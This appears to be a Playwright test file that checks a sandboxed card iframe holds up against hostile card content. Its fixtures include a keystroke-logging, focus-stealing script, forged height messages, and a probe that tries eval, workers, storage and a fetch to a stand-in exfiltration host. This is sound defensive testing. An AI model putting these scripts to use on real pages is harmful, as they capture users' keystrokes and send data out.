// SandboxFrame in a real browser. Every routed card document is a real response of the production mint and serve
// routes, so the policy the browser enforces is the policy the server emits.
import {
  buildCardFrameCsp,
  CARD_FRAME_SAFE_FLOOR,
  FRAME_FOCUS_GRAB_GAP_MS,
  FRAME_FOCUS_GRAB_LOOP_BOUND,
  foldCardFrameHeight,
  REPLY_FRAME_RESIZE_BURST,
  REPLY_FRAME_RESIZE_REFILL_MS,
  REPLY_FRAME_SETTLE_MS,
} from "@orb/kit/card-frame";
import { expect } from "@orb/testkit/ct-corpus";
import { LENGTH_BASE_PX, TOKENS } from "@orb/ui/tokens";
import type { Locator, Page } from "@playwright/test";
import { z } from "zod";
import type { FocusedBesideFrameStory, SandboxFrameStory, TwoFramesBesideFieldStory } from "./_frame-stories.tsx";
import type { FrameRoom, ServedFrame } from "./_served-frame.ts";
import { routeServedFrame, test } from "./_served-frame.ts";

const STORY = "tests/ui/content/sandbox-frame/_frame-stories/SandboxFrameStory";
const FOCUS_STORY = "tests/ui/content/sandbox-frame/_frame-stories/FocusedBesideFrameStory";
const FRAME = '[data-slot="sandbox-frame"]';
// Both bounds come from the production fold, not from a restated number.
const HEIGHT_CAP_PX = foldCardFrameHeight(undefined, { orbCardFrameHeight: Number.MAX_SAFE_INTEGER })?.px;
const MARK_RAN = 'document.body.setAttribute("data-card-ran","1");';
// The reviewed sandbox grants, spelled out on purpose: they are the contract under test, so a widened production
// constant must fail here rather than flow into both the expectation and the frame.
const ROUTED_SANDBOX_GRANT = "allow-scripts";
const FLOOR_SANDBOX_GRANT = "";

const script = (code: string): string => `<script>${code}</script>`;

const frameHeight = async (frame: Locator): Promise<number> => (await frame.boundingBox())?.height ?? 0;

/** Two animation frames order after every task queued before them, so "nothing moved" is not a race against a sleep. */
async function settle(page: Page): Promise<void> {
  await page.evaluate(
    async () =>
      await new Promise<void>((resolve) => {
        requestAnimationFrame(() => {
          requestAnimationFrame(() => {
            resolve();
          });
        });
      }),
  );
}

function collectConsoleErrors(page: Page): string[] {
  const errors: string[] = [];
  page.on("console", (message) => {
    if (message.type() === "error") {
      errors.push(message.text());
    }
  });
  return errors;
}

function directive(csp: string, name: string): string {
  const found = csp.split("; ").find((part) => part.startsWith(`${name} `));
  if (found === undefined) {
    throw new Error(`the served policy names no ${name}`);
  }
  return found;
}

/** The routed arm's props for one real served document. */
const routed = (served: ServedFrame, title: string): { readonly html: string; readonly title: string; readonly src: string } => ({
  html: "<p>unused</p>",
  title,
  src: served.url,
});

test("the srcdoc floor is script-dead: its sandbox grants nothing and an authored script never runs", async ({ mount, page }) => {
  const root = await mount<typeof SandboxFrameStory>(STORY, { html: `<p>card</p>${script(MARK_RAN)}`, title: "floor card" });
  const frame = root.locator(FRAME);
  await expect(frame).toHaveAttribute("data-delivery", "srcdoc");
  await expect(frame).toHaveAttribute("sandbox", FLOOR_SANDBOX_GRANT);
  await expect(frame).not.toHaveAttribute("src");
  // The card parsed, so the absent marker is about execution and not a document that never loaded.
  await expect(page.frameLocator(FRAME).locator("p")).toHaveText("card");
  await expect(page.frameLocator(FRAME).locator("body")).not.toHaveAttribute("data-card-ran", "1");
});

test("the srcdoc floor carries the production meta policy, and only the external-media verdict widens it", async ({ mount }) => {
  const metaPolicy = async (props: { readonly allowExternalMedia?: boolean }): Promise<string | null> => {
    const root = await mount<typeof SandboxFrameStory>(STORY, { html: "<p>x</p>", title: "floor card", ...props });
    const srcdoc = (await root.locator(FRAME).getAttribute("srcdoc")) ?? "";
    return /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/u.exec(srcdoc)?.[1] ?? null;
  };
  expect(await metaPolicy({})).toBe(buildCardFrameCsp(CARD_FRAME_SAFE_FLOOR, "meta", "static"));
  expect(await metaPolicy({ allowExternalMedia: true })).toBe(buildCardFrameCsp({ ...CARD_FRAME_SAFE_FLOOR, allowExternalMedia: true }, "meta", "static"));
});

test("the routed arm emits src and no srcdoc, under exactly the reviewed sandbox grant on the frame and the served policy", async ({ mount, room, page }) => {
  const served = await room.serve("<p>card</p>", null);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "routed card"))).locator(FRAME);
  await expect(frame).toHaveAttribute("src", served.url);
  await expect(frame).toHaveAttribute("data-delivery", "routed");
  await expect(frame).not.toHaveAttribute("srcdoc");
  await expect(frame).toHaveAttribute("sandbox", ROUTED_SANDBOX_GRANT);
  expect(directive(served.csp, "sandbox")).toBe(`sandbox ${ROUTED_SANDBOX_GRANT}`);
});

test("an incomplete card shows a skeleton, not the frame", async ({ mount }) => {
  const root = await mount<typeof SandboxFrameStory>(STORY, { html: "<p>x</p>", title: "x", complete: false });
  await expect(root.locator('[data-slot="sandbox-frame-skeleton"]')).toBeVisible();
  await expect(root.locator(FRAME)).toHaveCount(0);
});

test("the unmeasured frame and loading reservation share the token height", async ({ mount }) => {
  const root = await mount<typeof SandboxFrameStory>(STORY, { html: "<p>short</p>", title: "reserved card", complete: false });
  const skeleton = root.locator('[data-slot="sandbox-frame-skeleton"]');
  expect(await frameHeight(skeleton)).toBe(LENGTH_BASE_PX["height.chart"]);
  await root.update({ html: "<p>short</p>", title: "reserved card", complete: true });
  expect(await frameHeight(root.locator(FRAME))).toBe(LENGTH_BASE_PX["height.chart"]);
});

test("the frame is named in the tab order, even for a caller that passes an empty title", async ({ mount }) => {
  const root = await mount<typeof SandboxFrameStory>(STORY, { html: "<p>x</p>", title: "The Watcher" });
  await expect(root.locator(FRAME)).toHaveAccessibleName("The Watcher");
  const unnamed = await mount<typeof SandboxFrameStory>(STORY, { html: "<p>x</p>", title: "" });
  await expect(unnamed.locator(FRAME)).not.toHaveAccessibleName("");
});

test("a short static card measures itself and the frame drops below its pre-measurement height", async ({ mount, room, page }) => {
  const served = await room.serve('<div style="height:120px">short</div>', null);
  expect(served.granted.interactive).toBe(false);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "short card"))).locator(FRAME);
  await expect.poll(async () => frameHeight(frame)).toBe(120);
});

// A reply document whose content height changes every animation frame once the frame has settled, then rests at
// RESTING_PX: the pinned measure script reports every change, as a document whose height feeds back on itself would.
const RESTING_PX = 555;
const OSCILLATIONS = 240;
const RESIZES_ATTRIBUTE = "data-w6p-resizes";
const OSCILLATOR = `<div id="box" style="height:100px">reply</div>${script(
  [
    'const box=document.getElementById("box");let n=0;',
    `const tick=()=>{if(n<${String(OSCILLATIONS)}){box.style.height=(n%2===0?900:400)+(n%120)+"px";n+=1;requestAnimationFrame(tick);}else{box.style.height="${String(RESTING_PX)}px";document.body.setAttribute("data-done","1");}};`,
    `setTimeout(()=>{document.body.setAttribute("data-started","1");requestAnimationFrame(tick);},${String(REPLY_FRAME_SETTLE_MS + REPLY_FRAME_RESIZE_REFILL_MS)});`,
  ].join(""),
)}`;

test("a reply frame whose document resizes every animation frame applies a bounded number of resizes, then its last height", async ({ mount, room, page }) => {
  const served = await room.serve(OSCILLATOR);
  expect(served.granted.interactive).toBe(true);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, { ...routed(served, "oscillating reply"), holds: "reply" })).locator(FRAME);
  const body = page.frameLocator(FRAME).locator("body");
  await expect(body).toHaveAttribute("data-started", "1");
  // Count the frame's own applied heights from the moment the document starts to swing.
  const startedAt = await frame.evaluate((node, attribute) => {
    let count = 0;
    let last = node.getBoundingClientRect().height;
    new ResizeObserver(() => {
      const height = node.getBoundingClientRect().height;
      if (height !== last) {
        count += 1;
        last = height;
        node.setAttribute(attribute, String(count));
      }
    }).observe(node);
    return performance.now();
  }, RESIZES_ATTRIBUTE);
  await expect(body).toHaveAttribute("data-done", "1", { timeout: OSCILLATIONS * 100 });
  const elapsedMs = (await frame.evaluate(() => performance.now())) - startedAt;
  const count = Number((await page.locator(FRAME).getAttribute(RESIZES_ATTRIBUTE)) ?? "0");
  // The burst, one per refill over the window, and the resting height.
  expect(count).toBeLessThanOrEqual(REPLY_FRAME_RESIZE_BURST + Math.ceil(elapsedMs / REPLY_FRAME_RESIZE_REFILL_MS) + 1);
  // Positive control: the document did swing, so the frame was asked to resize far more often than it did.
  expect(count).toBeGreaterThan(0);
  await expect.poll(async () => frameHeight(frame), { timeout: REPLY_FRAME_RESIZE_REFILL_MS * 4 }).toBe(RESTING_PX);
});

test("an oversize self-report clamps to the cap", async ({ mount, room, page }) => {
  const served = await room.serve('<div style="height:5000px">tall</div>', null);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "tall card"))).locator(FRAME);
  await expect.poll(async () => frameHeight(frame)).toBe(HEIGHT_CAP_PX);
});

test("a card-authored script is refused by the served policy and cannot drive the height", async ({ mount, room, page }) => {
  const errors = collectConsoleErrors(page);
  const hostile = `<div style="height:100px">card</div>${script(`${MARK_RAN}parent.postMessage({orbCardFrameHeight:5000},"*");`)}`;
  const served = await room.serve(hostile, null);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "hostile card"))).locator(FRAME);
  // The frame's own measurement lands; a forged 5000 would have clamped to the cap, and it runs at parse, before ours.
  await expect.poll(async () => frameHeight(frame)).toBe(100);
  await settle(page);
  expect(await frameHeight(frame)).toBe(100);
  const refusal = errors.find((line) => line.includes("violates the following Content Security Policy directive"));
  expect(refusal).toBeDefined();
  expect(refusal).toContain(directive(served.csp, "script-src"));
  await expect(page.frameLocator(FRAME).locator("div")).toHaveText("card");
  await expect(page.frameLocator(FRAME).locator("body")).not.toHaveAttribute("data-card-ran", "1");
});

test("a height message from another window is ignored: the sender is authenticated by window identity", async ({ mount, room, page }) => {
  const served = await room.serve('<div style="height:100px">card</div>', null);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "card"))).locator(FRAME);
  await expect.poll(async () => frameHeight(frame)).toBe(100);
  await page.evaluate(() => {
    window.postMessage({ orbCardFrameHeight: 700 }, "*");
  });
  await settle(page);
  expect(await frameHeight(frame)).toBe(100);
});

test("the srcdoc floor does not self-measure: the caller's height stands", async ({ mount, page }) => {
  const root = await mount<typeof SandboxFrameStory>(STORY, { html: '<div style="height:60px">short</div>', title: "floor", heightPx: 200 });
  await settle(page);
  expect(await frameHeight(root.locator(FRAME))).toBe(200);
});

test("an interactive card's own script runs inside the frame under the served policy", async ({ mount, room, page }) => {
  const served = await room.serve(`<div style="height:100px">card</div>${script(MARK_RAN)}`);
  expect(served.granted.interactive).toBe(true);
  await routeServedFrame(page, served);
  await mount<typeof SandboxFrameStory>(STORY, routed(served, "interactive card"));
  await expect(page.frameLocator(FRAME).locator("body")).toHaveAttribute("data-card-ran", "1");
});

test("the interactive grant keeps the height channel working with no second allowance", async ({ mount, room, page }) => {
  const served = await room.serve('<div style="height:120px">short</div>');
  expect(served.granted.interactive).toBe(true);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "short interactive card"))).locator(FRAME);
  await expect.poll(async () => frameHeight(frame)).toBe(120);
});

test("an interactive card can forge the height message and the clamp is what holds", async ({ mount, room, page }) => {
  const served = await room.serve(`<div style="height:100px">card</div>${script('parent.postMessage({orbCardFrameHeight:99999},"*");')}`);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "forging card"))).locator(FRAME);
  await expect.poll(async () => frameHeight(frame)).toBe(HEIGHT_CAP_PX);
  await settle(page);
  expect(await frameHeight(frame)).toBe(HEIGHT_CAP_PX);
});

test("an interactive card reaches nothing new: no eval, no worker, no storage, no parent, no network", async ({ mount, room, page }) => {
  const probe = script(
    [
      "window.__reach={violated:[]};",
      'document.addEventListener("securitypolicyviolation",(e)=>{window.__reach.violated.push(e.effectiveDirective+" "+e.blockedURI);});',
      'const t=(k,f)=>{try{f();window.__reach[k]="allowed";}catch(e){window.__reach[k]="refused:"+e.name;}};',
      'const w=(k,u)=>{try{const x=new Worker(u);x.onmessage=()=>{window.__reach[k]="allowed";};x.onerror=()=>{window.__reach[k]="refused:error";};}catch(e){window.__reach[k]="refused:"+e.name;}};',
      't("eval",()=>{eval("1+1");});',
      't("newFunction",()=>{new Function("return 1")();});',
      'w("blobWorker",URL.createObjectURL(new Blob(["postMessage(1)"],{type:"text/javascript"})));',
      'w("dataWorker","data:text/javascript,postMessage(1)");',
      't("cookie",()=>{void document.cookie;});',
      't("localStorage",()=>{void localStorage.length;});',
      't("parentDom",()=>{void parent.document.title;});',
      'fetch("https://reach-exfil.test/x").then(()=>{window.__reach.fetch="allowed";},(e)=>{window.__reach.fetch="refused:"+e.name;});',
      MARK_RAN,
    ].join(""),
  );
  const served = await room.serve(`<p>reach</p>${probe}`);
  // The far end answers any request it receives, so a fetch the policy allowed would land here and read "allowed".
  const exfil: string[] = [];
  await page.route("https://reach-exfil.test/**", async (route) => {
    exfil.push(route.request().url());
    await route.fulfill({ status: 200, headers: { "access-control-allow-origin": "*" }, body: "ok" });
  });
  await routeServedFrame(page, served);
  await mount<typeof SandboxFrameStory>(STORY, routed(served, "reach card"));
  const body = page.frameLocator(FRAME).locator("body");
  // The marker proves the script ran under the grant, so each refusal below is a real one.
  await expect(body).toHaveAttribute("data-card-ran", "1");
  const handle = await (await page.locator(FRAME).elementHandle()).contentFrame();
  if (handle === null) {
    throw new Error("routed iframe has no content frame");
  }
  const reach = async (): Promise<Record<string, unknown>> =>
    z.record(z.string(), z.unknown()).parse(await handle.evaluate((): unknown => Reflect.get(globalThis, "__reach") ?? {}));
  await expect.poll(reach).toMatchObject({
    eval: "refused:EvalError",
    newFunction: "refused:EvalError",
    // A worker the policy allowed would post back and read "allowed"; a refused one fires its error event.
    blobWorker: "refused:error",
    dataWorker: "refused:error",
    cookie: "refused:SecurityError",
    localStorage: "refused:SecurityError",
    parentDom: "refused:SecurityError",
    fetch: "refused:TypeError",
  });
  // Each worker died on the served policy (worker-src falls back to script-src), not on an unrelated failure.
  expect((await reach())["violated"]).toEqual(expect.arrayContaining(["worker-src blob", "worker-src data"]));
  expect(exfil).toEqual([]);
});

test("a frame that focuses itself on load does not take the page's focus", async ({ mount, room, page }) => {
  const served = await room.serve(`<button id="grab">play</button>${script(`document.getElementById("grab").focus();${MARK_RAN}`)}`);
  await routeServedFrame(page, served);
  const root = await mount<typeof FocusedBesideFrameStory>(FOCUS_STORY, routed(served, "grabby card"));
  // The marker proves the grab ran inside the frame, so the focus assertion below is about the host taking it back.
  await expect(page.frameLocator(FRAME).locator("body")).toHaveAttribute("data-card-ran", "1");
  await settle(page);
  await expect(root.getByRole("textbox", { name: "Outside the frame", exact: true })).toBeFocused();
});

// A card that logs every key its document receives and counts its own focus calls, and focuses its own field when the
// page posts it a cue: the cue only times the script; the focus call is the frame's own, as a hostile card's would be.
const KEYS_ATTRIBUTE = "data-keys";
const GRABS_ATTRIBUTE = "data-grabs";
const STEAL = "steal";
const STEAL_LOOP = "steal-loop";
// Focus calls spaced well past the grab gap, as a reader's own refused moves come: their count and spacing.
const STEAL_SPACED = "steal-spaced";
const SPACED_GRABS = FRAME_FOCUS_GRAB_LOOP_BOUND + 1;
const SPACED_GRAB_MS = FRAME_FOCUS_GRAB_GAP_MS * 3;
// A loop that begins once the reader is typing and ends before the reader stops, inside the grab gap but slower than
// the reader's keys: its start, its period and how many focus calls it makes.
const STEAL_LOOP_LATER = "steal-loop-later";
const LATER_LOOP_START_MS = 150;
const LATER_LOOP_MS = 50;
const LATER_LOOP_GRABS = 6;
// Typed a key every TYPE_DELAY_MS, it outlasts the whole loop.
const LONG_TYPING = "the quick brown fox jumps over the lazy dog, and the lazy dog sleeps on";
const TYPE_DELAY_MS = 15;
const KEY_LOGGER = `<input id="field" aria-label="Field inside the frame">${script(
  [
    `document.addEventListener("keydown",(e)=>{document.body.setAttribute("${KEYS_ATTRIBUTE}",(document.body.getAttribute("${KEYS_ATTRIBUTE}")??"")+e.key);},true);`,
    `const grab=()=>{document.getElementById("field").focus();document.body.setAttribute("${GRABS_ATTRIBUTE}",String(Number(document.body.getAttribute("${GRABS_ATTRIBUTE}")??"0")+1));};`,
    `addEventListener("message",(e)=>{if(e.data==="${STEAL}"){grab();}if(e.data==="${STEAL_LOOP}"){setInterval(grab,5);}`,
    `if(e.data==="${STEAL_SPACED}"){let n=0;const t=setInterval(()=>{grab();n+=1;if(n>=${String(SPACED_GRABS)}){clearInterval(t);}},${String(SPACED_GRAB_MS)});}`,
    `if(e.data==="${STEAL_LOOP_LATER}"){setTimeout(()=>{let n=0;const t=setInterval(()=>{grab();n+=1;if(n>=${String(LATER_LOOP_GRABS)}){clearInterval(t);}},${String(LATER_LOOP_MS)});},${String(LATER_LOOP_START_MS)});}});`,
    MARK_RAN,
  ].join(""),
)}`;
const TYPED = "hunter2";
const TWO_FRAMES_STORY = "tests/ui/content/sandbox-frame/_frame-stories/TwoFramesBesideFieldStory";
const OUTSIDE_FIELD = { name: "Outside the frame", exact: true } as const;

/** Post `cue` to the nth frame's own window, from the page, so the frame's script acts on it. */
async function cueFrame(page: Page, nth: number, cue: string): Promise<void> {
  await page.evaluate(
    ({ selector, index, message }) => {
      const frame = document.querySelectorAll(selector)[index];
      if (!(frame instanceof HTMLIFrameElement) || frame.contentWindow === null) {
        throw new Error("no frame window to cue");
      }
      frame.contentWindow.postMessage(message, "*");
    },
    { selector: FRAME, index: nth, message: cue },
  );
}

/** The keys the nth frame's document received. */
async function keysInFrame(page: Page, nth: number): Promise<string> {
  return (await page.locator(FRAME).nth(nth).contentFrame().locator("body").getAttribute(KEYS_ATTRIBUTE)) ?? "";
}

/** Cue the nth frame to take focus, and wait until its focus call has run and the app has answered it. */
async function stealFocus(page: Page, nth: number): Promise<void> {
  const body = page.locator(FRAME).nth(nth).contentFrame().locator("body");
  const before = Number((await body.getAttribute(GRABS_ATTRIBUTE)) ?? "0");
  await cueFrame(page, nth, STEAL);
  await expect(body).toHaveAttribute(GRABS_ATTRIBUTE, String(before + 1));
  await settle(page);
}

/** A held press on the nth frame, as a reader's is: the gate reads the press while the button is down. */
async function pressFrame(page: Page, nth: number): Promise<void> {
  const box = await page.locator(FRAME).nth(nth).boundingBox();
  if (box === null) {
    throw new Error("the frame has no box to press");
  }
  await page.mouse.move(box.x + 20, box.y + 12);
  await page.mouse.down();
  await settle(page);
  await page.mouse.up();
}

/** Two key-logging interactive cards, served for real, as the props of the two-frame story. */
async function serveTwoKeyLoggers(
  room: FrameRoom,
  page: Page,
): Promise<{ readonly first: ReturnType<typeof routed>; readonly second: ReturnType<typeof routed> }> {
  const first = await room.serve(KEY_LOGGER);
  const second = await room.serve(KEY_LOGGER);
  expect(first.granted.interactive).toBe(true);
  await routeServedFrame(page, first);
  await routeServedFrame(page, second);
  return { first: routed(first, "first card"), second: routed(second, "second card") };
}

/** Both key loggers have loaded and run their script. */
async function keyLoggersReady(page: Page): Promise<void> {
  for (const nth of [0, 1]) {
    await expect(page.locator(FRAME).nth(nth).contentFrame().locator("body")).toHaveAttribute("data-card-ran", "1");
  }
}

test("a card's script that takes focus gets none of the reader's keys: focus goes back to the field", async ({ mount, room, page }) => {
  const root = await mount<typeof TwoFramesBesideFieldStory>(TWO_FRAMES_STORY, await serveTwoKeyLoggers(room, page));
  await keyLoggersReady(page);
  const field = root.getByRole("textbox", OUTSIDE_FIELD);
  await field.click();
  await stealFocus(page, 0);
  await expect(field).toBeFocused();
  await page.keyboard.type(TYPED);
  await expect(field).toHaveValue(TYPED);
  expect(await keysInFrame(page, 0)).toBe("");
});

test("a card that takes focus again and again has its scripts stopped, and the reader's keys stay in the field", async ({ mount, room, page }) => {
  const root = await mount<typeof TwoFramesBesideFieldStory>(TWO_FRAMES_STORY, await serveTwoKeyLoggers(room, page));
  await keyLoggersReady(page);
  const field = root.getByRole("textbox", OUTSIDE_FIELD);
  await field.click();
  await cueFrame(page, 1, STEAL_LOOP);
  // The looping card now draws on the script-dead floor; the other card, which took nothing, keeps its scripts.
  await expect(page.locator(FRAME).nth(1)).toHaveAttribute("data-delivery", "srcdoc");
  await expect(page.locator(FRAME).nth(0)).toHaveAttribute("data-delivery", "routed");
  await expect(field).toBeFocused();
  await page.keyboard.type(TYPED, { delay: 15 });
  await expect(field).toHaveValue(TYPED);
  expect(await keysInFrame(page, 0)).toBe("");
});

test("a grab loop that begins while the reader is typing is stopped at the bound", async ({ mount, room, page }) => {
  const root = await mount<typeof TwoFramesBesideFieldStory>(TWO_FRAMES_STORY, await serveTwoKeyLoggers(room, page));
  await keyLoggersReady(page);
  const field = root.getByRole("textbox", OUTSIDE_FIELD);
  await field.click();
  await cueFrame(page, 1, STEAL_LOOP_LATER);
  // The card still runs as the reader starts, so the stop below comes from the loop that began during the typing.
  await expect(page.locator(FRAME).nth(1)).toHaveAttribute("data-delivery", "routed");
  // The whole loop runs inside the typing: the reader's keys fall between its refusals, and none break the run.
  await page.keyboard.type(LONG_TYPING, { delay: TYPE_DELAY_MS });
  await expect(page.locator(FRAME).nth(1)).toHaveAttribute("data-delivery", "srcdoc");
  await expect(field).toBeFocused();
  await field.fill("");
  await page.keyboard.type(TYPED);
  await expect(field).toHaveValue(TYPED);
});

test("a press on a card gives its own field the reader's keys, and the other card's script cannot take them", async ({ mount, room, page }) => {
  await mount<typeof TwoFramesBesideFieldStory>(TWO_FRAMES_STORY, await serveTwoKeyLoggers(room, page));
  await keyLoggersReady(page);
  await pressFrame(page, 0);
  await page.keyboard.type("ab");
  await expect.poll(async () => keysInFrame(page, 0)).toBe("ab");
  await stealFocus(page, 1);
  await page.keyboard.type("cd");
  await expect.poll(async () => keysInFrame(page, 0)).toBe("abcd");
  expect(await keysInFrame(page, 1)).toBe("");
  // A press on the other card moves the reader there.
  await pressFrame(page, 1);
  await page.keyboard.type("ef");
  await expect.poll(async () => keysInFrame(page, 1)).toBe("ef");
});

test("Tab from the app enters a card and Shift+Tab leaves it; a press released off the card earns its later script nothing", async ({ mount, room, page }) => {
  const root = await mount<typeof TwoFramesBesideFieldStory>(TWO_FRAMES_STORY, await serveTwoKeyLoggers(room, page));
  await keyLoggersReady(page);
  const field = root.getByRole("textbox", OUTSIDE_FIELD);
  await field.click();
  await page.keyboard.press("Tab");
  await page.keyboard.type("xy");
  await expect.poll(async () => keysInFrame(page, 0)).toBe("xy");
  await page.keyboard.press("Shift+Tab");
  await expect(field).toBeFocused();
  // A press that starts on the second card and is released over the field, then a click back in the field.
  const box = await page.locator(FRAME).nth(1).boundingBox();
  if (box === null) {
    throw new Error("the frame has no box to press");
  }
  await page.mouse.move(box.x + 20, box.y + 12);
  await page.mouse.down();
  await field.hover();
  await page.mouse.up();
  await field.click();
  await stealFocus(page, 1);
  await expect(field).toBeFocused();
  await page.keyboard.type("zz");
  await expect(field).toHaveValue("zz");
  expect(await keysInFrame(page, 1)).toBe("");
});

// Where the reader goes after typing in a card, and what the field holds once they type there: a click below every
// control leaves focus on the page itself, with no app element to take it.
const LEAVE_CARD = [
  {
    name: "the bare page",
    leave: async (page: Page): Promise<void> => {
      const viewport = page.viewportSize();
      await page.mouse.click((viewport?.width ?? 1) - 2, (viewport?.height ?? 1) - 2);
    },
    landed: "BODY",
    fieldValue: "",
  },
  {
    name: "the field",
    leave: async (page: Page): Promise<void> => {
      await page.getByRole("textbox", OUTSIDE_FIELD).click();
    },
    landed: "INPUT",
    fieldValue: TYPED,
  },
] as const;

for (const { name, leave, landed, fieldValue } of LEAVE_CARD) {
  test(`a card the reader pressed into, left for ${name}, gets none of the reader's keys when its script takes focus back`, async ({ mount, room, page }) => {
    const root = await mount<typeof TwoFramesBesideFieldStory>(TWO_FRAMES_STORY, await serveTwoKeyLoggers(room, page));
    await keyLoggersReady(page);
    await pressFrame(page, 0);
    await page.keyboard.type("ab");
    await expect.poll(async () => keysInFrame(page, 0)).toBe("ab");
    await leave(page);
    await expect.poll(async () => page.locator("body").evaluate(() => document.activeElement?.tagName)).toBe(landed);
    await stealFocus(page, 0);
    await expect.poll(async () => page.locator("body").evaluate(() => document.activeElement?.tagName)).toBe(landed);
    await page.keyboard.type(TYPED);
    expect(await keysInFrame(page, 0)).toBe("ab");
    await expect(root.getByRole("textbox", OUTSIDE_FIELD)).toHaveValue(fieldValue);
  });
}

test("a card refused now and then, as a reader's own moves are, keeps its scripts; only a grab loop stops them", async ({ mount, room, page }) => {
  const root = await mount<typeof TwoFramesBesideFieldStory>(TWO_FRAMES_STORY, await serveTwoKeyLoggers(room, page));
  await keyLoggersReady(page);
  const field = root.getByRole("textbox", OUTSIDE_FIELD);
  await field.click();
  // Each focus call comes well past the gap after the last, with nothing in the app between them.
  await cueFrame(page, 0, STEAL_SPACED);
  await expect(page.locator(FRAME).nth(0).contentFrame().locator("body")).toHaveAttribute(GRABS_ATTRIBUTE, String(SPACED_GRABS), {
    timeout: SPACED_GRABS * SPACED_GRAB_MS * 4,
  });
  await settle(page);
  await expect(field).toBeFocused();
  // Every call was refused, and the card's scripts still run: one more focus call is still answered.
  await expect(page.locator(FRAME).nth(0)).toHaveAttribute("data-delivery", "routed");
  await stealFocus(page, 0);
  await expect(field).toBeFocused();
  // Positive control in the same card: a grab loop does stop it.
  await cueFrame(page, 0, STEAL_LOOP);
  await expect(page.locator(FRAME).nth(0)).toHaveAttribute("data-delivery", "srcdoc");
});

test("a frame that outgrows its box scrolls inside itself with the thin themed bar", async ({ mount, room, page }) => {
  // The bar is tinted from the frame's foreground token, so the served document needs the theme token to resolve it.
  const served = await room.serve('<div style="height:3000px">tall</div>', null, {
    "--sandbox-bg": TOKENS["color.primary"].value,
    "--sandbox-fg": TOKENS["color.user-bubble"].value,
  });
  await routeServedFrame(page, served);
  await mount<typeof SandboxFrameStory>(STORY, routed(served, "tall card"));
  const handle = await (await page.locator(FRAME).elementHandle()).contentFrame();
  if (handle === null) {
    throw new Error("routed iframe has no content frame");
  }
  await expect(handle.locator("div")).toHaveText("tall");
  const readBar = (): Promise<{ readonly width: string; readonly color: string }> =>
    handle.evaluate(() => {
      const style = getComputedStyle(document.documentElement);
      return { width: style.scrollbarWidth, color: style.scrollbarColor };
    });
  await expect.poll(async () => (await readBar()).width).toBe("thin");
  await expect.poll(async () => (await readBar()).color).not.toBe("auto");
});
